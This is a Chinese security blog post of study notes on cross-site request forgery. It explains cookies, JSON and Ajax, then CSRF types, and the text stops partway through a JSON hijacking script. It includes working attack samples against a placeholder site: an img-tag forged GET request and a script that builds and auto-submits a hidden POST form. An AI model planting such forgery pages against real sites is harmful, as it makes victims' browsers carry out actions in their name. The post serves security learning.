<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content="CSRF,JSON,Ajax"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>m0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="m0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00  前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">0x01  基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie"><span class="toc-number">2.1.</span> <span class="toc-text">Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON"><span class="toc-number">2.2.</span> <span class="toc-text">JSON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ajax"><span class="toc-number">2.3.</span> <span class="toc-text">Ajax</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ajax-%E7%AE%80%E4%BB%8B"><span class="toc-number">2.3.1.</span> <span class="toc-text">Ajax 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ajax-XHR"><span class="toc-number">2.3.2.</span> <span class="toc-text">Ajax XHR</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ox02-%E4%BB%80%E4%B9%88%E6%98%AFCSRF"><span class="toc-number">3.</span> <span class="toc-text">Ox02  什么是CSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-CSRF%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.</span> <span class="toc-text">0x03  CSRF类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GET%E5%9E%8B-CSRF"><span class="toc-number">4.1.</span> <span class="toc-text">GET型 CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST%E5%9E%8B-CSRF"><span class="toc-number">4.2.</span> <span class="toc-text">POST型 CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-CSRF"><span class="toc-number">4.3.</span> <span class="toc-text">HTML CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON-HiJacking"><span class="toc-number">4.4.</span> <span class="toc-text">JSON HiJacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flash-CSRF"><span class="toc-number">4.5.</span> <span class="toc-text">Flash CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%8E%B7%E5%8F%96%E9%9A%90%E7%A7%81%E6%95%B0%E6%8D%AE"><span class="toc-number">4.5.1.</span> <span class="toc-text">跨域获取隐私数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E6%8F%90%E4%BA%A4%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C"><span class="toc-number">4.5.2.</span> <span class="toc-text">跨域提交数据操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-%E8%A0%95%E8%99%AB"><span class="toc-number">4.6.</span> <span class="toc-text">CSRF 蠕虫</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-CSRF%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">0x04  CSRF防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81HTTP-Referer%E5%AD%97%E6%AE%B5"><span class="toc-number">5.1.</span> <span class="toc-text">验证HTTP Referer字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E8%AF%B7%E6%B1%82%E5%9C%B0%E5%9D%80%E4%B8%AD%E6%B7%BB%E5%8A%A0token%E5%B9%B6%E9%AA%8C%E8%AF%81"><span class="toc-number">5.2.</span> <span class="toc-text">在请求地址中添加token并验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8HTTP%E5%A4%B4%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7%E5%B9%B6%E9%AA%8C%E8%AF%81"><span class="toc-number">5.3.</span> <span class="toc-text">在HTTP头中自定义属性并验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-Token"><span class="toc-number">5.4.</span> <span class="toc-text">CSRF-Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number">5.5.</span> <span class="toc-text">使用验证码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-CSRF%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">0x05 CSRF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87Referer"><span class="toc-number">6.1.</span> <span class="toc-text">绕过Referer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Refere%E4%B8%BA%E7%A9%BA%E6%9D%A1%E4%BB%B6%E4%B8%8B"><span class="toc-number">6.1.1.</span> <span class="toc-text">Refere为空条件下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%ADReferer%E6%98%AF%E6%9F%90%E5%9F%9F%E6%83%85%E5%86%B5%E4%B8%8B%E7%BB%95%E8%BF%87"><span class="toc-number">6.1.2.</span> <span class="toc-text">判断Referer是某域情况下绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%ADReferer%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%9F%90%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-number">6.1.3.</span> <span class="toc-text">判断Referer是否存在某关键词</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%ADreferer%E6%98%AF%E5%90%A6%E6%9C%89%E6%9F%90%E5%9F%9F%E5%90%8D"><span class="toc-number">6.1.4.</span> <span class="toc-text">判断referer是否有某域名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A7%BB%E9%99%A4referer%E5%AD%97%E6%AE%B5"><span class="toc-number">6.2.</span> <span class="toc-text">移除referer字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-number">6.3.</span> <span class="toc-text">点击劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95"><span class="toc-number">6.4.</span> <span class="toc-text">更改请求方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4token%E5%8F%82%E6%95%B0%E6%88%96%E5%8F%91%E9%80%81%E7%A9%BAtoken"><span class="toc-number">6.5.</span> <span class="toc-text">删除token参数或发送空token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%A6%E4%B8%80%E4%B8%AAsession%E7%9A%84CSRF-token"><span class="toc-number">6.6.</span> <span class="toc-text">使用另一个session的CSRF token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Session%E5%9B%BA%E5%AE%9A"><span class="toc-number">6.7.</span> <span class="toc-text">Session固定</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-CSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">7.</span> <span class="toc-text">0x06 CSRF漏洞挖掘</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">0x07  总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">9.</span> <span class="toc-text">0x08  参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">60</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">53</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">m0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">说说</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">No title</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-07</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/TOP10%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">TOP10基础漏洞</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">5.3k</span><span class="post-meta__separator">|</span><span>Reading time: 18 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><a id="more"></a>

<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>CSRF,即跨站请求伪造</p>
<p>OWASP于2007年将CSRF归类进 OWASP TOP 10安全风险中,虽然年代久远,但是还是值得学习</p>
<blockquote>
<p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p>
</blockquote>
<h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>cookie分为<strong>内存cookie和本地cookie</strong></p>
<p>内存cookie</p>
<blockquote>
<p>指的是没有设置有效时间的Cookie，默认的情况下只要关闭了浏览器，Cookie也会被销毁。（Cookie存在于浏览器的内存中，当关闭了浏览器Cookie就销毁了）。</p>
</blockquote>
<p>本地cookie</p>
<blockquote>
<p>指的是有有效时间的Cookie，这种Cookie的内容不是保存在浏览器的内存中，将Cookie的内容保存（持久化）到硬盘上。这个时候，关闭浏览器，再次打开浏览器会加载硬盘上的文件，从而Cookie中的数据就不会丢失。</p>
</blockquote>
<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/json/">JSON学习</a></p>
<p>JSON是JavaScript Object Notation(对象表示方法)的缩写，它是一种数据交换格式并且是超轻量级的数据交换格式。JSON具有自我描述性,更易理解.JSON并非编程语言</p>
<p>JSON数据类型</p>
<ul>
<li>number：和JavaScript的<code>number</code>完全一致；</li>
<li>boolean：就是JavaScript的<code>true</code>或<code>false</code>；</li>
<li>string：就是JavaScript的<code>string</code>；</li>
<li>null：就是JavaScript的<code>null</code>；</li>
<li>array：就是JavaScript的<code>Array</code>表示方式——<code>[]</code>；</li>
<li>object：就是JavaScript的<code>&#123; ... &#125;</code>表示方式。</li>
</ul>
<p>以上的数据类型可以任意组合,此外JSON规定了字符集必须是<strong>UTF-8</strong>,并且<strong>字符串规定必须使用双引号” “,Object的键也必须使用双引号</strong></p>
<p>把任何JavaScript对象变成JSON，就是把这个对象序列化成一个JSON格式的字符串，这样才能够通过网络传递给其他计算机。</p>
<p>如果我们收到一个JSON格式的字符串，只需要把它反序列化成一个JavaScript对象，就可以在JavaScript中直接使用这个对象了。</p>
<p>基本语法</p>
<ul>
<li>数据使用名/值对表示。</li>
<li>使用大括号保存对象，每个名称后面跟着一个 ‘:’（冒号），名/值对使用 ,（逗号）分割。</li>
<li>使用方括号保存数组，数组值使用 ,（逗号）分割。</li>
</ul>
<p>JSON对象是在花括号{}中的,JSON数组是在[]中的</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var json-object-name = &#123; string : number_value, .......&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;book&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;id&quot;</span>:<span class="string">&quot;01&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;language&quot;</span>: <span class="string">&quot;Java&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;edition&quot;</span>: <span class="string">&quot;third&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Herbert Schildt&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;id&quot;</span>:<span class="string">&quot;07&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;language&quot;</span>: <span class="string">&quot;C++&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;edition&quot;</span>: <span class="string">&quot;second&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;E.Balagurusamy&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JSON字典格式)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&quot;id&quot;:1,</span><br><span class="line"></span><br><span class="line">&quot;name&quot;: &quot;IFONLY&quot;,</span><br><span class="line"></span><br><span class="line">&quot;email&quot;:&quot;ifonly_go2019@163.com&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>列表模式)</p>
<p>[“foo”,”xoo”,”coo”]</p>
<h2 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h2><p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/ajax/index.asp">Ajax学习</a></p>
<h3 id="Ajax-简介"><a href="#Ajax-简介" class="headerlink" title="Ajax 简介"></a>Ajax 简介</h3><p>AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。</p>
<p>AJAX 不是新的编程语言，而是一种<strong>使用现有标准的新方法。</strong></p>
<p>AJAX 是<strong>与服务器交换数据</strong>并更新部分网页的艺术，在<strong>不重新加载整个页面的情况下</strong>。</p>
<p>在 2005 年，Google 通过其 Google Suggest 使 AJAX 变得流行起来。</p>
<p>Google Suggest 使用 AJAX 创造出动态性极强的 web 界面：当您在谷歌的搜索框输入关键字时，JavaScript 会把这些字符发送到服务器，然后服务器会返回一个搜索建议的列表。</p>
<h3 id="Ajax-XHR"><a href="#Ajax-XHR" class="headerlink" title="Ajax XHR"></a>Ajax XHR</h3><p>1.创建XMLHttpRequest 对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable = <span class="keyword">new</span> XMLHttpRequest();</span><br></pre></td></tr></table></figure>

<p>2.向服务器发送请求</p>
<p>使用XMLHttpRequest 对象的 open()和 send() 方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;shell.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<p>open(method,url,async) ,规定请求的类型,URL以及是否异步处理请求</p>
<ul>
<li>method: 请求的类型;GET/POST</li>
<li>url: 文件在服务器上的位置</li>
<li>async: true(异步)/false(同步)</li>
</ul>
<p>GET请求与POST请求相比,GET简单快速,并且在大部分情况下都能用</p>
<p>但是在下面的情况必须使用POST请求</p>
<ul>
<li>无法使用缓存文件</li>
<li>向服务器发送大量数据,POST没数据限制</li>
<li>发送包含位置字符的用户输入,POST更稳定可靠</li>
</ul>
<p>使用GET方法发送信息,就在URL 中添加信息</p>
<p>像HTML表单那样POST数据,使用setRequestHeader()来添加HTTP头,并在send()方法中规定发送的数据,举个例子</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;shell.asp&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xmlhttp.send(<span class="string">&quot;fname=IF&amp;lname=ONLY&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>open()方法的url参数是服务器上文件的地址,该文件是任何类型的文件,比如.txt .xml .php .asp(在传回响应之前,能够在服务器上执行任务)</p>
<blockquote>
<p>XMLHttpRequest对象如果要用AJAX,其中open()方法的async参数必须设置为true</p>
</blockquote>
<p>3.服务器响应</p>
<p>使用XMLHttpRequest对象responseText/responeseXML属性</p>
<p>如果服务器的响应不是XML,就使用responseText属性,该属性以字符串的形式返回</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;myDiv&quot;</span>).innerHTML=xmlhttp.responseText;</span><br></pre></td></tr></table></figure>

<p>当readyState等于4 且状态为 200时,表示响应已就绪</p>
<p><strong>callback函数</strong></p>
<p>callback 函数是一种<strong>以参数形式</strong>传递给另一个函数的函数。</p>
<h1 id="Ox02-什么是CSRF"><a href="#Ox02-什么是CSRF" class="headerlink" title="Ox02  什么是CSRF"></a>Ox02  什么是CSRF</h1><p>CSRF(Cross-site request forgery)是 跨站请求伪造,这个漏洞容易与XSS漏洞混淆.CSRF攻击的发生是由各种请求造成的,对于CSRF来说,该请求有两个关键点: </p>
<ul>
<li>跨站点的请求</li>
<li>请求是伪造的</li>
</ul>
<p><img src="https://image.3001.net/images/20171025/15089150893738.png!small"></p>
<p>攻击者盗用了合法用户的身份，以合法用户的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的操作，比如以合法用户的名义发送邮件、发消息，添加系统管理员，甚至于购买商品、虚拟货币转账等。 </p>
<p>CSRF攻击流程</p>
<blockquote>
<p>受害者登录a.com，并保留了登录凭证（Cookie）。</p>
<p>攻击者引诱受害者访问了b.com。</p>
<p>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。</p>
<p>a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</p>
<p>a.com以受害者的名义执行了act=xx。</p>
<p>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。</p>
</blockquote>
<p>比如删除文章 <a target="_blank" rel="noopener" href="http://www.a.com/blog/del?id=1">www.a.com/blog/del?id=1</a></p>
<p>如何欺骗</p>
<ul>
<li>利用AJAX跨域时带上目标域的会话</li>
<li>用代码</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http:<span class="comment">//www.a.com/blog/del?id=1 /&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在<a target="_blank" rel="noopener" href="http://www.b.com/">www.b.com</a> 编写一个CSRF页面,欺骗已经登录a网站的用户访问有CSRF的页面</li>
</ul>
<p>攻击过程有<strong>三个关键点</strong></p>
<ul>
<li>跨域发出GET请求</li>
<li>可以无javascript参与</li>
<li>请求是身份认证后的</li>
</ul>
<h1 id="0x03-CSRF类型"><a href="#0x03-CSRF类型" class="headerlink" title="0x03  CSRF类型"></a>0x03  CSRF类型</h1><h2 id="GET型-CSRF"><a href="#GET型-CSRF" class="headerlink" title="GET型 CSRF"></a>GET型 CSRF</h2><p>GET型的CSRF就是刚开始举的那个例子</p>
<p>GET型的CSRF HTTP请求头中,除了请求来源Referer值不一样外,其他都一样,尤其是<strong>cookie</strong> </p>
<h2 id="POST型-CSRF"><a href="#POST型-CSRF" class="headerlink" title="POST型 CSRF"></a>POST型 CSRF</h2><p>比如网站A的”写文章”功能,这是一个提交表单的操作,就会发起POST请求.这个POST请求可以从网站b发出,通过javascript自动生成一份表单,表单的action地址指向目标网站a的”写文章”表单提交地址</p>
<p>代码举例(by 余玄)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;&lt;/body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">new_form</span>(<span class="params"></span>)</span>&#123;<span class="comment">// 创建表单函数</span></span><br><span class="line">    <span class="keyword">var</span> f =<span class="built_in">document</span>.createElement(<span class="string">&quot;form&quot;</span>);</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(f);</span><br><span class="line">    f.method = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> f;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_elements</span>(<span class="params">eForm,eName,eValue</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 创建表单项函数,eForm: 表单对象,eName: 表单项,eValue: 表单项值</span></span><br><span class="line">    <span class="keyword">var</span> e = <span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">    eForm.appendChild(e);</span><br><span class="line">    e.type = <span class="string">&#x27;text&#x27;</span>;</span><br><span class="line">    e.name = eName;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">document</span>.all)&#123;e.style.dispaly = <span class="string">&#x27;none&#x27;</span>;&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        e.style.dispaly = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        e.style.width = <span class="string">&#x27;0px&#x27;</span>;</span><br><span class="line">        e.style.height = <span class="string">&#x27;0px&#x27;</span>;</span><br><span class="line">    &#125;<span class="comment">// 兼容浏览器的隐藏设置,目的是让表单看不见</span></span><br><span class="line">    e.value = eValue;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> _f = new_form(); <span class="comment">//创建表单对象</span></span><br><span class="line">create_elements(_f,<span class="string">&quot;title&quot;</span>,<span class="string">&quot;hi&quot;</span>); <span class="comment">//创建表单项: title=hi</span></span><br><span class="line">create_elements(_f,<span class="string">&quot;content&quot;</span>,<span class="string">&quot;csrf_here&quot;</span>); <span class="comment">//创建表单项: content=csrf_here</span></span><br><span class="line">_f.action = <span class="string">&quot;http://www.a.com/blog/add&quot;</span>; <span class="comment">//设置表单action提交地址为目标网站a的/blog/add页面</span></span><br><span class="line">_f.submit(); <span class="comment">//自动提交</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>构造完成后,当a网站的用户被欺骗访问恶意网站b的这个页面时,一个跨域的伪造的POST表单请求就发出了.</p>
<p>并且携带了a网站用户的cookie</p>
<h2 id="HTML-CSRF"><a href="#HTML-CSRF" class="headerlink" title="HTML CSRF"></a>HTML CSRF</h2><p>这一类是最普遍的CSRF攻击,能够发起这些请求的HTML元素有: </p>
<ul>
<li><code>&lt;link href=&quot;&quot;&gt;</code></li>
<li><code>&lt;img src=&quot;&quot;&gt;</code></li>
<li><code>&lt;img lowsrc=&quot;&quot;&gt;</code></li>
<li><code>&lt;img dynsrc=&quot;&quot;&gt;</code></li>
<li><code>&lt;meta http-equiv=&quot;refresh&quot; conten=&quot;0;url=&quot;&gt;</code></li>
<li><code>&lt;iframe src=&quot;&quot;&gt;</code></li>
<li><code>&lt;frame src=&quot;&quot;&gt;</code></li>
<li><code>&lt;script src=&quot;&quot;&gt;</code></li>
<li><code>&lt;bgsound src=&quot;&quot;&gt;</code></li>
<li><code>&lt;embed src=&quot;&quot;&gt;</code></li>
<li><code>&lt;video src=&quot;&quot;&gt;</code></li>
<li><code>&lt;audio src=&quot;&quot;&gt;</code></li>
<li><code>&lt;a href=&quot;&quot;&gt;</code></li>
<li><code>&lt;table background=&quot;&quot;&gt;</code></li>
</ul>
<p>…</p>
<p>CSS样式中的: </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">background:</span>url(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>..</p>
<blockquote>
<p>还有通过javascript动态生成的标签对象或CSS对象发起的GET请求,而发起POST请求智能通过form提交方式</p>
</blockquote>
<h2 id="JSON-HiJacking"><a href="#JSON-HiJacking" class="headerlink" title="JSON HiJacking"></a>JSON HiJacking</h2><p>这种攻击的过程是CSRF,不过是对AJAX响应中最常见的JSON数据类型进行的劫持攻击</p>
<p>正如前面提到的 callback函数是可以自定义的,自定义一个JSON Hijacking页面,代码如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hijack</span>(<span class="params"><span class="number">0</span></span>)</span>&#123; <span class="comment">// 自定义的劫持函数</span></span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> data = <span 